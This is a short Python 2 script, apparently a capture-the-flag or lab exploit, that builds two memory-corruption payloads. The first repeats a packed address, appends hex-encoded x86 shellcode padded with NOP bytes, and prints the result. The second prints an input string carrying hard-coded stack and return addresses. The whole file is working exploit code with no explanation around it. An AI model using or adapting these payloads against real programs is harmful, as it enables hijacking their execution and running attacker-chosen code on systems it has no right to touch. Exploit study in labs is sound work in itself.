import struct
x = struct.pack('<I', 0xb7fed000)
sc = '31d231dbb3038d4c2430b250525153e81100000083c40cb3018d4c24305153e808000000ccb8c6970408ffe0b8b08e0408ffe0'.decode('hex')
sc = sc + (4 - len(sc) % 4) * '\x90'
payload1 = x * (3000 / len(x)) + sc + x * (5000 / len(x))
print payload1

payload2 = '1 ' * 382 + '= ' * 11 + hex(0xbaaa8fe4 - 22) + ' 0xbaaa9ba0'
print payload2
